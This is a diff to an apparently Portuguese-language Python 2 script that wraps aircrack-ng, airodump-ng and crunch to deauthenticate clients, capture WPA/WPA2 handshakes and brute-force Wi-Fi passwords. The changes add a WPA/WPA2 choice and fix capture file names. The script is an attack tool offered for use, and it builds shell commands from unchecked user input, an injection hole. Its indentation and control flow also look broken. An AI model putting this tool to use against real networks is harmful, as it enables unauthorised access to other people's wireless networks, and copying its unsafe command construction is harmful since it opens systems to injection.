@@ -39,15 +39,20 @@ def dos():
 def crack():
 	print("Aguarde o handshake")
     	quebra = raw_input('\033[31m'+ "Digite (c) após capturar o handshake (r) para atacar novamente ou qualquer outra tecla para sair: "+'\033[0;0m')
-    	if(quebra == 'c'):
+    	if(quebra == 'c' and rede == '2'):
 			dec = raw_input("Digite (p) para utilizar uma lista ou digite (d) para criar uma lista: ")
 			if(dec == 'p'):
 				lista = raw_input("Digite o caminho da sua lista: ")
-    				os.system("aircrack-ng -w " + lista + " -b " +  bssid + ' ' + saida + ".cap")
+    				os.system("aircrack-ng -w " + lista + " -b " +  bssid + ' ' + saida + "-01.cap")			
+
 			if(dec == 'd'):
 				crunch()	
 			else:
 				return crack	
+	if(quebra == 'c' and rede == 'w'):
+			os.system("aircrack-ng " + saida + "-01.cap")
+			
+
 	elif(quebra == 'r'):
 		dos()
 	       	return crack()
@@ -56,6 +61,7 @@ def crack():
 		os.system("ifconfig" + ' ' + inter + "mon" + " up") 
 		os.system("/etc/init.d/network-manager restart ")
 		os.system("clear")
+	
 
 def crunch():
     global mini, maxi, cara
@@ -64,10 +70,10 @@ def crunch():
     cara = raw_input("Insira os caracteres que deseja utilizar(ex: abcdABCD1234!@#$: ")
    
     novo = os.system("crunch " + mini + " " + maxi + " " + cara + " -o lista.txt")
-    os.system("aircrack-ng -w lista.txt -b "  +  bssid + ' ' + saida +  " .cap")
+    os.system("aircrack-ng -w lista.txt -b "  +  bssid + ' ' + saida +  "-01.cap")
 
 def executar():
-    global canal, bssid, essid, mac, inter, saida
+    global canal, bssid, essid, mac, inter, saida, rede
     c = "c"
     s = "s"
     ent = input("Tecle (c) para 'C'ontinuar ou (s) para 'S'air: ")
@@ -82,6 +88,7 @@ def executar():
     		os.system("airmon-ng start" + ' ' + inter)
     		os.system("gnome-terminal -- airodump-ng" + ' ' + inter + "mon") 
 	os.system("clear")
+	rede = raw_input("Digite 'w' para WPA ou '2' para WPA2: ")
     	canal = raw_input("Digite o canal da rede: ")
     	bssid = raw_input("Digite o BSSID da rede escolhida: ")
 	essid = raw_input("Digite o ESSID da rede escolhida: ")
